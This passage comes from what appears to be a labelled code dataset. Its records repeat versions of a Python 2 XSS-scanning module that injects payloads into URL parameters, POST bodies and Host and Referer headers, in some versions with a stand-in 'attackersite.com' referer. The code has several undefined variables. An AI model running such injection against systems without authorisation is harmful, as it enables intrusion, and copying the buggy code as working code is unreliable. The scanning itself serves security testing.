fetch_xss_payload():\n    # Returns xss payloads in list type\n    payload_list = []\n    if os.getcwd().split('/')[-1] == 'API':\n        path = '../Payloads/xss.txt'\n    else:\n        path = 'Payloads/xss.txt'\n\n    with open(path) as f:\n        for line in f:\n            if line:\n                payload_list.append(line.rstrip())\n\n    return payload_list\n\ndef check_xss_impact(res_headers):\n    # Return the impact of XSS based on content-type header\n    print \"response header\",res_headers['Content-Type']\n    if res_headers['Content-Type']:\n        if res_headers['Content-Type'].find('application/json') != -1 or res_headers['Content-Type'].find('text/plain') != -1:\n            # Possible XSS \n            impact = \"Low\"\n        else:\n            impact = \"High\"\n    else:\n        impact = \"Low\"\n\n    return impact\n\n\ndef xss_payload_decode(payload):\n    # Return decoded payload of XSS. \n    decoded_payload = urllib.unquote(payload).decode('utf8').encode('ascii','ignore')\n    return decoded_payload\n\ndef xss_post_method(url,method,headers,body,scanid=None):\n    # This function checks XSS through POST method.\n    print url, headers,method,body\n    temp_body = {}\n    post_vul_param = ''\n    for key,value in body.items():\n        xss_payloads = fetch_xss_payload()\n        for payload in xss_payloads:\n            temp_body.update(body)\n            temp_body[key] = payload\n            print \"updated body\",temp_body\n            xss_post_request = req.api_request(url, \"POST\", headers, temp_body)\n            decoded_payload = xss_payload_decode(payload)\n            if xss_post_request.text.find(decoded_payload) != -1:\n                impact = check_xss_impact(xss_post.body)\n                if db_update is not True:\n                    attack_result = { \"id\" : 11, \"scanid\" : scanid, \"url\" : xss_url, \"alert\": \"Cross Site Scripting\", \"impact\": impact, \"req_headers\": headers, \"req_body\":body, \"res_headers\": xss_request.headers ,\"res_body\": xss_request.text}\n                    dbupdate.insert_record(attack_result)\n                    db_update = True\n                    vul_param += key\n                else:\n                    result = True\n                    if vul_param == '':\n                        post_vul_param += key\n                    else:\n                        post_vul_param += ','+key \n\n    if post_vul_param:\n        dbupdate.update_record({\"scanid\": scanid}, {\"$set\" : {\"scan_data\" : post_vul_param+\" are vulnerable to XSS\"}})\n\n\ndef xss_http_headers(url,method,headers,body,scanid=None):\n    # This function checks different header based XSS.\n    # XSS via Host header (Limited to IE)\n    # Reference : http://sagarpopat.in/2017/03/06/yahooxss/\n    temp_headers = {}\n    temp_headers.update(headers)\n    xss_payloads = fetch_xss_payload()\n    for payload in xss_payloads:\n        parse_domain = urlparse.urlparse(url).netloc\n        host_header = {\"Host\" : parse_domain + '/' + payload}\n        headers.update(host_header)\n        host_header_xss = req.api_request(url, \"GET\", headers)\n        decoded_payload = xss_payload_decode(payload)\n        if host_header_xss.text.find(decoded_payload) != -1:\n            impact = \"Low\"\n            print \"%s[{0}] {1} is vulnerable to XSS%s\".format(impact,url)% (api_logger.G, api_logger.W)\n            attack_result = { \"id\" : 11, \"scanid\" : scanid, \"url\" : url, \"alert\": \"Cross Site Scripting\", \"impact\": impact, \"req_headers\": headers, \"req_body\":body, \"res_headers\": host_header_xss.headers ,\"res_body\": host_header_xss.text}\n            dbupdate.insert_record(attack_result)\n            break\n\n    # Test for Referer based XSS \n    for payload in xss_payloads:\n        referer_header_value = 'http://attackersite.com?test='+payload\n        referer_header = {\"Referer\" : referer_header_value}\n        temp_headers.update(referer_header)\n        ref_header_xss = req.api_request(url, \"GET\", temp_headers)\n        decoded_payload = xss_payload_decode(payload)\n        if ref_header_xss.text.find(decoded_payload) != -1:\n            print ref_header_xss.text\n            impact = check_xss_impact(temp_headers)\n            print \"%s[{0}] {1} is vulnerable to XSS via referer header%s\".format(impact,url)% (api_logger.G, api_logger.W)\n            attack_result = { \"id\" : 11, \"scanid\" : scanid, \"url\" : url, \"alert\": \"Cross Site Scripting via referer header\", \"impact\": impact, \"req_headers\": temp_headers, \"req_body\":body, \"res_headers\": ref_header_xss.headers ,\"res_body\": ref_header_xss.text}\n            dbupdate.insert_record(attack_result)\n            return\n\n\ndef xss_get_url(url,method,headers,body,scanid=None):\n    # Check for URL based XSS. \n    # Ex: http://localhost/<payload>, http://localhost//?randomparam=<payload>\n    result = ''\n    xss_payloads = fetch_xss_payload()\n    uri_check_list = ['?', '&', '=', '%3F', '%26', '%3D']\n    for uri_list in uri_check_list:\n        if uri_list in url:\n            # Parse domain name from URI.\n            parsed_url = urlparse.urlparse(url).scheme+\"://\"+urlparse.urlparse(url).netloc+urlparse.urlparse(url).path\n            break\n\n    if parsed_url == '':\n        parsed_url = url\n\n    for payload in xss_payloads:\n        xss_request_url = req.api_request(parsed_url+'/'+payload,\"GET\",headers)\n        if result is not True:\n            decoded_payload = xss_payload_decode(payload)\n            if xss_request_url.text.find(decoded_payload) != -1:\n                impact = check_xss_impact(xss_request_url.headers)\n                attack_result = { \"id\" : 11, \"scanid\" : scanid, \"url\" : url, \"alert\": \"Cross Site Scripting\", \"impact\": impact, \"req_headers\": headers, \"req_body\":body, \"res_headers\": xss_request_url.headers ,\"res_body\": xss_request_url.text}\n                dbupdate.insert_record(attack_result)\n                result = True\n\n        xss_request_uri = req.api_request(parsed_url+'/?test='+payload,\"GET\",headers)             \n        if xss_request_url.text.find(decoded_payload) != -1:\n            impact = check_xss_impact(xss_request_uri.headers)\n            print \"%s[{0}] {1} is vulnerable to XSS%s\".format(impact,url)% (api_logger.G, api_logger.W)\n            attack_result = { \"id\" : 11, \"scanid\" : scanid, \"url\" : url, \"alert\": \"Cross Site Scripting\", \"impact\": impact, \"req_headers\": headers, \"req_body\":body, \"res_headers\": xss_request_url.headers ,\"res_body\": xss_request_url.text}\n            dbupdate.insert_record(attack_result)\n                \n\ndef xss_get_uri(url,method,headers,body,scanid=None):\n    # This function checks for URI based XSS. \n    # http://localhost/?firstname=<payload>&lastname=<payload>\n    db_update = ''\n    vul_param = ''\n    url_query = urlparse.urlparse(url)\n    parsed_query = urlparse.parse_qs(url_query.query)\n    if parsed_query:\n        for key,value in parsed_query.items():\n            try:\n                result = ''\n                logs.logging.info(\"GET param for xss : %s\",key)\n                xss_payloads = fetch_xss_payload()\n                for payload in xss_payloads:\n                    # check for URI based XSS\n                    # Example : http://localhost/?firstname=<payload>&lastname=<payload>\n                    if result is not True:\n                        parsed_url = urlparse.urlparse(url)\n                        xss_url = parsed_url.scheme+\"://\"+parsed_url.netloc+parsed_url.path+\"/?\"+parsed_url.query.replace(value[0], payload)\n                        xss_request = req.api_request(xss_url,\"GET\",headers)\n                        decoded_payload = xss_payload_decode(payload)\n                        print decoded_payload\n                        print xss_url\n                        if xss_request.text.find(decoded_payload) != -1:\n                            impact = check_xss_impact(xss_request.headers)\n                            logs.logging.info(\"%s is vulnerable to XSS\",url)\n                            print \"%s[{0}] {1} is vulnerable to XSS%s\".format(impact,url)% (api_logger.G, api_logger.W)\n                            if db_update is not True:\n                                attack_result = { \"id\" : 11, \"scanid\" : scanid, \"url\" : xss_url, \"alert\": \"Cross Site Scripting\", \"impact\": impact, \"req_headers\": headers, \"req_body\":body, \"res_headers\": xss_request.headers ,\"res_body\": xss_request.text}\n                                dbupdate.insert_record(attack_result)\n                                result,db_update = True,True\n                                vul_param += key\n                            else:\n                                result = True\n                                if vul_param == '':\n                                    vul_param += key\n                                else:\n                                    vul_param += ','+key                  \n        \n            except:\n                logs.logging.info(\"XSS: No GET param found!\")\n\n        if vul_param:\n            # Update all vulnerable params to db.\n            print vul_param,scanid\n            dbupdate.update_record({\"scanid\": scanid}, {\"$set\" : {\"scan_data\" : vul_param+\" parameters are vulnerable to XSS\"}})\n\n\ndef xss_check(url,method,headers,body,scanid):\n    # Main function for XSS attack\n    if method == 'GET' or method == 'DEL':\n        xss_get_uri(url,method,headers,body,scanid)\n        xss_get_url(url,method,headers,body,scanid)\n\n    if method == 'POST' or method == 'PUT':\n        xss_post_method(url,method,headers,body,scanid)\n\n    xss_http_headers(url,method,headers,body,scanid)/n/n/n", "label": 1}, {"id": "adf60251870f581f368cfd5a6d5e0337e9ba4c76", "code": "modules/xss.py/n/nimport os\nimport urlparse\nimport sendrequest as req\nimport utils.logs as logs\nimport urlparse\nimport time\nimport urllib\n\nfrom utils.logger import logger\nfrom utils.db import Database_update\nfrom utils.config import get_value\n\ndbupdate = Database_update()\napi_logger = logger()\n\ndef fetch_xss_payload():\n    # Returns xss payloads in list type\n    payload_list = []\n    if os.getcwd().split('/')[-1] == 'API':\n        path = '../Payloads/xss.txt'\n    else:\n        path = 'Payloads/xss.txt'\n\n    with open(path) as f:\n        for line in f:\n            if line:\n                payload_list.append(line.rstrip())\n\n    return payload_list\n\ndef check_xss_impact(res_headers):\n    # Return the impact of XSS based on content-type header\n    print \"response header\",res_headers['Content-Type']\n    if res_headers['Content-Type']:\n        if res_headers['Content-Type'].find('application/json') != -1 or res_headers['Content-Type'].find('text/plain') != -1:\n            # Possible XSS \n            impact = \"Low\"\n        else:\n            impact = \"High\"\n    else:\n        impact = \"Low\"\n\n    return impact\n\n\ndef xss_payload_decode(payload):\n    # Return decoded payload of XSS. \n    decoded_payload = urllib.unquote(payload).decode('utf8').encode('ascii','ignore')\n    return decoded_payload\n\ndef xss_post_method(url,method,headers,body,scanid=None):\n    # This function checks XSS through POST method.\n    print url, headers,method,body\n    temp_body = {}\n    post_vul_param = ''\n    for key,value in body.items():\n        xss_payloads = fetch_xss_payload()\n        for payload in xss_payloads:\n            temp_body.update(body)\n            temp_body[key] = payload\n            print \"updated body\",temp_body\n            xss_post_request = req.api_request(url, \"POST\", headers, temp_body)\n            decoded_payload = xss_payload_decode(payload)\n            if xss_post_request.text.find(decoded_payload) != -1:\n                impact = check_xss_impact(xss_post_request.headers)\n                if db_update is not True:\n                    attack_result = { \"id\" : 11, \"scanid\" : scanid, \"url\" : xss_url, \"alert\": \"Cross Site Scripting\", \"impact\": impact, \"req_headers\": headers, \"req_body\":body, \"res_headers\": xss_request.headers ,\"res_body\": xss_request.text}\n                    dbupdate.insert_record(attack_result)\n                    db_update = True\n                    vul_param += key\n                else:\n                    result = True\n                    if vul_param == '':\n                        post_vul_param += key\n                    else:\n                        post_vul_param += ','+key \n\n    if post_vul_param:\n        dbupdate.update_record({\"scanid\": scanid}, {\"$set\" : {\"scan_data\" : post_vul_param+\" are vulnerable to XSS\"}})\n\n\ndef xss_http_headers(url,method,headers,body,scanid=None):\n    # This function checks different header based XSS.\n    # XSS via Host header (Limited to IE)\n    # Reference : http://sagarpopat.in/2017/03/06/yahooxss/\n    temp_headers = {}\n    temp_headers.update(headers)\n    xss_payloads = fetch_xss_payload()\n    for payload in xss_payloads:\n        parse_domain = urlparse.urlparse(url).netloc\n        host_header = {\"Host\" : parse_domain + '/' + payload}\n        headers.update(host_header)\n        host_header_xss = req.api_request(url, \"GET\", headers)\n        decoded_payload = xss_payload_decode(payload)\n        if host_header_xss.text.find(decoded_payload) != -1:\n            impact = \"Low\"\n            print \"%s[{0}] {1} is vulnerable to XSS%s\".format(impact,url)% (api_logger.G, api_logger.W)\n            attack_result = { \"id\" : 11, \"scanid\" : scanid, \"url\" : url, \"alert\": \"Cross Site Scripting\", \"impact\": impact, \"req_headers\": headers, \"req_body\":body, \"res_headers\": host_header_xss.headers ,\"res_body\": host_header_xss.text}\n            dbupdate.insert_record(attack_result)\n            break\n\n    # Test for Referer based XSS \n    for payload in xss_payloads:\n        referer_header_value = 'http://attackersite.com?test='+payload\n        referer_header = {\"Referer\" : referer_header_value}\n        temp_headers.update(referer_header)\n        ref_header_xss = req.api_request(url, \"GET\", temp_headers)\n        decoded_payload = xss_payload_decode(payload)\n        if ref_header_xss.text.find(decoded_payload) != -1:\n            print ref_header_xss.text\n            impact = check_xss_impact(temp_headers)\n            print \"%s[{0}] {1} is vulnerable to XSS via referer header%s\".format(impact,url)% (api_logger.G, api_logger.W)\n            attack_result = { \"id\" : 11, \"scanid\" : scanid, \"url\" : url, \"alert\": \"Cross Site Scripting via referer header\", \"impact\": impact, \"req_headers\": temp_headers, \"req_body\":body, \"res_headers\": ref_header_xss.headers ,\"res_body\": ref_header_xss.text}\n            dbupdate.insert_record(attack_result)\n            return\n\n\ndef xss_get_url(url,method,headers,body,scanid=None):\n    # Check for URL based XSS. \n    # Ex: http://localhost/<payload>, http://localhost//?randomparam=<payload>\n    result = ''\n    xss_payloads = fetch_xss_payload()\n    uri_check_list = ['?', '&', '=', '%3F', '%26', '%3D']\n    for uri_list in uri_check_list:\n        if uri_list in url:\n            # Parse domain name from URI.\n            parsed_url = urlparse.urlparse(url).scheme+\"://\"+urlparse.urlparse(url).netloc+urlparse.urlparse(url).path\n            break\n\n    if parsed_url == '':\n        parsed_url = url\n\n    for payload in xss_payloads:\n        xss_request_url = req.api_request(parsed_url+'/'+payload,\"GET\",headers)\n        if result is not True:\n            decoded_payload = xss_payload_decode(payload)\n            if xss_request_url.text.find(decoded_payload) != -1:\n                impact = check_xss_impact(xss_request_url.headers)\n                attack_result = { \"id\" : 11, \"scanid\" : scanid, \"url\" : url, \"alert\": \"Cross Site Scripting\", \"impact\": impact, \"req_headers\": headers, \"req_body\":body, \"res_headers\": xss_request_url.headers ,\"res_body\": xss_request_url.text}\n                dbupdate.insert_record(attack_result)\n                result = True\n\n        xss_request_uri = req.api_request(parsed_url+'/?test='+payload,\"GET\",headers)             \n        if xss_request_url.text.find(decoded_payload) != -1:\n            impact = check_xss_impact(xss_request_uri.headers)\n            print \"%s[{0}] {1} is vulnerable to XSS%s\".format(impact,url)% (api_logger.G, api_logger.W)\n            attack_result = { \"id\" : 11, \"scanid\" : scanid, \"url\" : url, \"alert\": \"Cross Site Scripting\", \"impact\": impact, \"req_headers\": headers, \"req_body\":body, \"res_headers\": xss_request_url.headers ,\"res_body\": xss_request_url.text}\n            dbupdate.insert_record(attack_result)\n                \n\ndef xss_get_uri(url,method,headers,body,scanid=None):\n    # This function checks for URI based XSS. \n    # http://localhost/?firstname=<payload>&lastname=<payload>\n    db_update = ''\n    vul_param = ''\n    url_query = urlparse.urlparse(url)\n    parsed_query = urlparse.parse_qs(url_query.query)\n    if parsed_query:\n        for key,value in parsed_query.items():\n            try:\n                result = ''\n                logs.logging.info(\"GET param for xss : %s\",key)\n                xss_payloads = fetch_xss_payload()\n                for payload in xss_payloads:\n                    # check for URI based XSS\n                    # Example : http://localhost/?firstname=<payload>&lastname=<payload>\n                    if result is not True:\n                        parsed_url = urlparse.urlparse(url)\n                        xss_url = parsed_url.scheme+\"://\"+parsed_url.netloc+parsed_url.path+\"/?\"+parsed_url.query.replace(value[0], payload)\n                        xss_request = req.api_request(xss_url,\"GET\",headers)\n                        decoded_payload = xss_payload_decode(payload)\n                        print decoded_payload\n                        print xss_url\n                        if xss_request.text.find(decoded_payload) != -1:\n                            impact = check_xss_impact(xss_request.headers)\n                            logs.logging.info(\"%s is vulnerable to XSS\",url)\n                            print \"%s[{0}] {1} is vulnerable to XSS%s\".format(impact,url)% (api_logger.G, api_logger.W)\n                            if db_update is not True:\n                                attack_result = { \"id\" : 11, \"scanid\" : scanid, \"url\" : xss_url, \"alert\": \"Cross Site Scripting\", \"impact\": impact, \"req_headers\": headers, \"req_body\":body, \"res_headers\": xss_request.headers ,\"res_body\": xss_request.text}\n                                dbupdate.insert_record(attack_result)\n                                result,db_update = True,True\n                                vul_param += key\n                            else:\n                                result = True\n                                if vul_param == '':\n                                    vul_param += key\n                                else:\n                                    vul_param += ','+key                  \n        \n            except:\n                logs.logging.info(\"XSS: No GET param found!\")\n\n        if vul_param:\n            # Update all vulnerable params to db.\n            print vul_param,scanid\n            dbupdate.update_record({\"scanid\": scanid}, {\"$set\" : {\"scan_data\" : vul_param+\" parameters are vulnerable to XSS\"}})\n\n\ndef xss_check(url,method,headers,body,scanid):\n    # Main function for XSS attack\n    if method == 'GET' or method == 'DEL':\n        xss_get_uri(url,method,headers,body,scanid)\n        xss_get_url(url,method,headers,body,scanid)\n\n    if method == 'POST' or method == 'PUT':\n        xss_post_method(url,method,headers,body,scanid)\n\n    xss_http_headers(url,method,headers,body,scanid)/n/n/n", "label": 0}, {"id": "adf60251870f581f368cfd5a6d5e0337e9ba4c76", "code": "/modules/xss.py/n/nimport os\nimport urlparse\nimport sendrequest as req\nimport utils.logs as logs\nimport urlparse\nimport time\nimport urllib\n\nfrom utils.logger import logger\nfrom utils.db import Database_update\nfrom utils.config import get_value\n\ndbupdate = Database_update()\napi_logger = logger()\n\ndef fetch_xss_payload():\n    # Returns xss payloads in list type\n    payload_list = []\n    if os.getcwd().split('/')[-1] == 'API':\n        path = '../Payloads/xss.txt'\n    else:\n        path = 'Payloads/xss.txt'\n\n    with open(path) as f:\n        for line in f:\n            if line:\n                payload_list.append(line.rstrip())\n\n    return payload_list\n\ndef check_xss_impact(res_headers):\n    # Return the impact of XSS based on content-type header\n    print \"response header\",res_headers['Content-Type']\n    if res_headers['Content-Type']:\n        if res_headers['Content-Type'].find('application/json') != -1 or res_headers['Content-Type'].find('text/plain') != -1:\n            # Possible XSS \n            impact = \"Low\"\n        else:\n            impact = \"High\"\n    else:\n        impact = \"Low\"\n\n    return impact\n\n\ndef xss_payload_decode(payload):\n    # Return decoded payload of XSS. \n    decoded_payload = urllib.unquote(payload).decode('utf8').encode('ascii','ignore')\n    return decoded_payload\n\ndef xss_post_method(url,method,headers,body,scanid=None):\n    # This function checks XSS through POST method.\n    print url, headers,method,body\n    temp_body = {}\n    post_vul_param = ''\n    for key,value in body.items():\n        xss_payloads = fetch_xss_payload()\n        for payload in xss_payloads:\n            temp_body.update(body)\n            temp_body[key] = payload\n            print \"updated body\",temp_body\n            xss_post_request = req.api_request(url, \"POST\", headers, temp_body)\n            decoded_payload = xss_payload_decode(payload)\n            if xss_post_request.text.find(decoded_payload) != -1:\n                impact = check_xss_impact(xss_post.body)\n                if db_update is not True:\n                    attack_result = { \"id\" : 11, \"scanid\" : scanid, \"url\" : xss_url, \"alert\": \"Cross Site Scripting\", \"impact\": impact, \"req_headers\": headers, \"req_body\":body, \"res_headers\": xss_request.headers ,\"res_body\": xss_request.text}\n                    dbupdate.insert_record(attack_result)\n                    db_update = True\n                    vul_param += key\n                else:\n                    result = True\n                    if vul_param == '':\n                        post_vul_param += key\n                    else:\n                        post_vul_param += ','+key \n\n    if post_vul_param:\n        dbupdate.update_record({\"scanid\": scanid}, {\"$set\" : {\"scan_data\" : post_vul_param+\" are vulnerable to XSS\"}})\n\n\ndef xss_http_headers(url,method,headers,body,scanid=None):\n    # This function checks different header based XSS.\n    # XSS via Host header (Limited to IE)\n    # Reference : http://sagarpopat.in/2017/03/06/yahooxss/\n    temp_headers = {}\n    temp_headers.update(headers)\n    xss_payloads = fetch_xss_payload()\n    for payload in xss_payloads:\n        parse_domain = urlparse.urlparse(url).netloc\n        host_header = {\"Host\" : parse_domain + '/' + payload}\n        headers.update(host_header)\n        host_header_xss = req.api_request(url, \"GET\", headers)\n        decoded_payload = xss_payload_decode(payload)\n        if host_header_xss.text.find(decoded_payload) != -1:\n            impact = \"Low\"\n            print \"%s[{0}] {1} is vulnerable to XSS%s\".format(impact,url)% (api_logger.G, api_logger.W)\n            attack_result = { \"id\" : 11, \"scanid\" : scanid, \"url\" : url, \"alert\": \"Cross Site Scripting\", \"impact\": impact, \"req_headers\": headers, \"req_body\":body, \"res_headers\": host_header_xss.headers ,\"res_body\": host_header_xss.text}\n            dbupdate.insert_record(attack_result)\n            break\n\n    # Test for Referer based XSS \n    for payload in xss_payloads:\n        referer_header_value = 'http://attackersite.com?test='+payload\n        referer_header = {\"Referer\" : referer_header_value}\n        temp_headers.update(referer_header)\n        ref_header_xss = req.api_request(url, \"GET\", temp_headers)\n        decoded_payload = xss_payload_decode(payload)\n        if ref_header_xss.text.find(decoded_payload) != -1:\n            print ref_header_xss.text\n            impact = check_xss_impact(temp_headers)\n            print \"%s[{0}] {1} is vulnerable to XSS via referer header%s\".format(impact,url)% (api_logger.G, api_logger.W)\n            attack_result = { \"id\" : 11, \"scanid\" : scanid, \"url\" : url, \"alert\": \"Cross Site Scripting via referer header\", \"impact\": impact, \"req_headers\": temp_headers, \"req_body\":body, \"res_headers\": ref_header_xss.headers ,\"res_body\": ref_header_xss.text}\n            dbupdate.insert_record(attack_result)\n            return\n\n\ndef xss_get_url(url,method,headers,body,scanid=None):\n    # Check for URL based XSS. \n    # Ex: http://localhost/<payload>, http://localhost//?randomparam=<payload>\n    result = ''\n    xss_payloads = fetch_xss_payload()\n    uri_check_list = ['?', '&', '=', '%3F', '%26', '%3D']\n    for uri_list in uri_check_list:\n        if uri_list in url:\n            # Parse domain name from URI.\n            parsed_url = urlparse.urlparse(url).scheme+\"://\"+urlparse.urlparse(url).netloc+urlparse.urlparse(url).path\n            break\n\n    if parsed_url == '':\n        parsed_url = url\n\n    for payload in xss_payloads:\n        xss_request_url = req.api_request(parsed_url+'/'+payload,\"GET\",headers)\n        if result is not True:\n            decoded_payload = xss_payload_decode(payload)\n            if xss_request_url.text.find(decoded_payload) != -1:\n                impact = check_xss_impact(xss_request_url.headers)\n                attack_result = { \"id\" : 11, \"scanid\" : scanid, \"url\" : url, \"alert\": \"Cross Site Scripting\", \"impact\": impact, \"req_headers\": headers, \"req_body\":body, \"res_headers\": xss_request_url.headers ,\"res_body\": xss_request_url.text}\n                dbupdate.insert_record(attack_result)\n                result = True\n\n        xss_request_uri = req.api_request(parsed_url+'/?test='+payload,\"GET\",headers)             \n        if xss_request_url.text.find(decoded_payload) != -1:\n            impact = check_xss_impact(xss_request_uri.headers)\n            print \"%s[{0}] {1} is vulnerable to XSS%s\".format(impact,url)% (api_logger.G, api_logger.W)\n            attack_result = { \"id\" : 11, \"scanid\" : scanid, \"url\" : url, \"alert\": \"Cross Site Scripting\", \"impact\": impact, \"req_headers\": headers, \"req_body\":body, \"res_headers\": xss_request_url.headers ,\"res_body\": xss_request_url.text}\n            dbupdate.insert_record(attack_result)\n                \n\ndef xss_get_uri(url,method,headers,body,scanid=None):\n    # This function checks for URI based XSS. \n    # http://localhost/?firstname=<payload>&lastname=<payload>\n    db_update = ''\n    vul_param = ''\n    url_query = urlparse.urlparse(url)\n    parsed_query = urlparse.parse_qs(url_query.query)\n    if parsed_query:\n        for key,value in parsed_query.items():\n            try:\n                result = ''\n                logs.logging.info(\"GET param for xss : %s\",key)\n                xss_payloads = fetch_xss_payload()\n                for payload in xss_payloads:\n                    # check for URI based XSS\n                    # Example : http://localhost/?firstname=<payload>&lastname=<payload>\n                    if result is not True:\n                        parsed_url = urlparse.urlparse(url)\n                        xss_url = parsed_url.scheme+\"://\"+parsed_url.netloc+parsed_url.path+\"/?\"+parsed_url.query.replace(value[0], payload)\n                        xss_request = req.api_request(xss_url,\"GET\",headers)\n                        decoded_payload = xss_payload_decode(payload)\n                        print decoded_payload\n                        print xss_url\n                        if xss_request.text.find(decoded_payload) != -1:\n                            impact = check_xss_impact(xss_request.headers)\n                            logs.logging.info(\"%s is vulnerable to XSS\",url)\n                            print \"%s[{0}] {1} is vulnerable to XSS%s\".format(impact,url)% (api_logger.G, api_logger.W)\n                            if db_update is not True:\n                                attack_result = { \"id\" : 11, \"scanid\" : scanid, \"url\" : xss_url, \"alert\": \"Cross Site Scripting\", \"impact\": impact, \"req_headers\": headers, \"req_body\":body, \"res_headers\": xss_request.headers ,\"res_body\": xss_request.text}\n                                dbupdate.insert_record(attack_result)\n                                result,db_update = True,True\n                                vul_param += key\n                            else:\n                                result = True\n                                if vul_param == '':\n                                    vul_param += key\n                                else:\n                                    vul_param += ','+key                  \n        \n            except:\n                logs.logging.info(\"XSS: No GET param found!\")\n\n        if vul_param:\n            # Update all vulnerable params to db.\n            print vul_param,scanid\n            dbupdate.update_record({\"scanid\": scanid}, {\"$set\" : {\"scan_data\" : vul_param+\" parameters are vulnerable to XSS\"}})\n\n\ndef xss_check(url,method,headers,body,scanid):\n    # Main function for XSS attack\n    if method == 'GET' or method == 'DEL':\n        xss_get_uri(url,method,headers,body,scanid)\n        xss_get_url(url,method,headers,body,scanid)\n\n    if method == 'POST' or method == 'PUT':\n        xss_post_method(url,method,headers,body,scanid)\n\n    xss_http_headers(url,method,headers,body,scanid)/n/n/n", "label": 1}, {"id": "9d52656d839d6a97eeca12578ca127318a367e00", "code": "modules/xss.py/n/nimport os\nimport urlparse\nimport sendrequest as req\nimport utils.logs as logs\nimport urlparse\nimport time\nimport urllib\n\nfrom utils.logger import logger\nfrom utils.db import Database_update\nfrom utils.config import get_value\n\ndbupdate = Database_update()\napi_logger = logger()\n\ndef fetch_xss_payload():\n    # Returns xss payloads in list type\n    payload_list = []\n    if os.getcwd().split('/')[-1] == 'API':\n        path = '../Payloads/xss.txt'\n    else:\n        path = 'Payloads/xss.txt'\n\n    with open(path) as f:\n        for line in f:\n            if line:\n                payload_list.append(line.rstrip())\n\n    return payload_list\n\ndef check_xss_impact(res_headers):\n    # Return the impact of XSS based on content-type header\n    print \"response header\",res_headers['Content-Type']\n    if res_headers['Content-Type']:\n        if res_headers['Content-Type'].find('application/json') != -1 or res_headers['Content-Type'].find('text/plain') != -1:\n            # Possible XSS \n            impact = \"Low\"\n        else:\n            impact = \"High\"\n    else:\n        impact = \"Low\"\n\n    return impact\n\n\ndef xss_payload_decode(payload):\n    # Return decoded payload of XSS. \n    decoded_payload = urllib.unquote(payload).decode('utf8').encode('ascii','ignore')\n    return decoded_payload\n\ndef xss_post_method(url,method,headers,body,scanid=None):\n    # This function checks XSS through POST method.\n    print url, headers,method,body\n    temp_body = {}\n    post_vul_param = ''\n    for key,value in body.items():\n        xss_payloads = fetch_xss_payload()\n        for payload in xss_payloads:\n            temp_body.update(body)\n            temp_body[key] = payload\n            print \"updated body\",temp_body\n            xss_post_request = req.api_request(url, \"POST\", headers, temp_body)\n            decoded_payload = xss_payload_decode(payload)\n            if xss_post_request.text.find(decoded_payload) != -1:\n                impact = check_xss_impact(xss_post_request.headers)\n                if db_update is not True:\n                    attack_result = { \"id\" : 11, \"scanid\" : scanid, \"url\" : xss_url, \"alert\": \"Cross Site Scripting\", \"impact\": impact, \"req_headers\": headers, \"req_body\":body, \"res_headers\": xss_request.headers ,\"res_body\": xss_request.text}\n                    dbupdate.insert_record(attack_result)\n                    db_update = True\n                    vul_param += key\n                else:\n                    result = True\n                    if vul_param == '':\n                        post_vul_param += key\n                    else:\n                        post_vul_param += ','+key \n\n    if post_vul_param:\n        dbupdate.update_record({\"scanid\": scanid}, {\"$set\" : {\"scan_data\" : post_vul_param+\" are vulnerable to XSS\"}})\n\n\ndef xss_http_headers(url,method,headers,body,scanid=None):\n    # This function checks different header based XSS.\n    # XSS via Host header (Limited to IE)\n    # Reference : http://sagarpopat.in/2017/03/06/yahooxss/\n    temp_headers = {}\n    temp_headers.update(headers)\n    xss_payloads = fetch_xss_payload()\n    for payload in xss_payloads:\n        parse_domain = urlparse.urlparse(url).netloc\n        host_header = {\"Host\" : parse_domain + '/' + payload}\n        headers.update(host_header)\n        host_header_xss = req.api_request(url, \"GET\", headers)\n        decoded_payload = xss_payload_decode(payload)\n        if host_header_xss.text.find(decoded_payload) != -1:\n            impact = \"Low\"\n            print \"%s[{0}] {1} is vulnerable to XSS%s\".format(impact,url)% (api_logger.G, api_logger.W)\n            attack_result = { \"id\" : 11, \"scanid\" : scanid, \"url\" : url, \"alert\": \"Cross Site Scripting\", \"impact\": impact, \"req_headers\": headers, \"req_body\":body, \"res_headers\": host_header_xss.headers ,\"res_body\": host_header_xss.text}\n            dbupdate.insert_record(attack_result)\n            break\n\n    # Test for Referer based XSS \n    for payload in xss_payloads:\n        referer_header_value = 'https://github.com?test='+payload\n        referer_header = {\"Referer\" : referer_header_value}\n        temp_headers.update(referer_header)\n        ref_header_xss = req.api_request(url, \"GET\", temp_headers)\n        decoded_payload = xss_payload_decode(payload)\n        if ref_header_xss.text.find(decoded_payload) != -1:\n            print ref_header_xss.text\n            impact = check_xss_impact(temp_headers)\n            print \"%s[{0}] {1} is vulnerable to XSS via referer header%s\".format(impact,url)% (api_logger.G, api_logger.W)\n            attack_result = { \"id\" : 11, \"scanid\" : scanid, \"url\" : url, \"alert\": \"Cross Site Scripting via referer header\", \"impact\": impact, \"req_headers\": temp_headers, \"req_body\":body, \"res_headers\": ref_header_xss.headers ,\"res_body\": ref_header_xss.text}\n            dbupdate.insert_record(attack_result)\n            return\n\n\ndef xss_get_url(url,method,headers,body,scanid=None):\n    # Check for URL based XSS. \n    # Ex: http://localhost/<payload>, http://localhost//?randomparam=<payload>\n    result = ''\n    xss_payloads = fetch_xss_payload()\n    uri_check_list = ['?', '&', '=', '%3F', '%26', '%3D']\n    for uri_list in uri_check_list:\n        if uri_list in url:\n            # Parse domain name from URI.\n            parsed_url = urlparse.urlparse(url).scheme+\"://\"+urlparse.urlparse(url).netloc+urlparse.urlparse(url).path\n            break\n\n    if parsed_url == '':\n        parsed_url = url\n\n    for payload in xss_payloads:\n        xss_request_url = req.api_request(parsed_url+'/'+payload,\"GET\",headers)\n        if result is not True:\n            decoded_payload = xss_payload_decode(payload)\n            if xss_request_url.text.find(decoded_payload) != -1:\n                impact = check_xss_impact(xss_request_url.headers)\n                attack_result = { \"id\" : 11, \"scanid\" : scanid, \"url\" : url, \"alert\": \"Cross Site Scripting\", \"impact\": impact, \"req_headers\": headers, \"req_body\":body, \"res_headers\": xss_request_url.headers ,\"res_body\": xss_request_url.text}\n                dbupdate.insert_record(attack_result)\n                result = True\n\n        xss_request_uri = req.api_request(parsed_url+'/?test='+payload,\"GET\",headers)             \n        if xss_request_url.text.find(decoded_payload) != -1:\n            impact = check_xss_impact(xss_request_uri.headers)\n            print \"%s[{0}] {1} is vulnerable to XSS%s\".format(impact,url)% (api_logger.G, api_logger.W)\n            attack_result = { \"id\" : 11, \"scanid\" : scanid, \"url\" : url, \"alert\": \"Cross Site Scripting\", \"impact\": impact, \"req_headers\": headers, \"req_body\":body, \"res_headers\": xss_request_url.headers ,\"res_body\": xss_request_url.text}\n            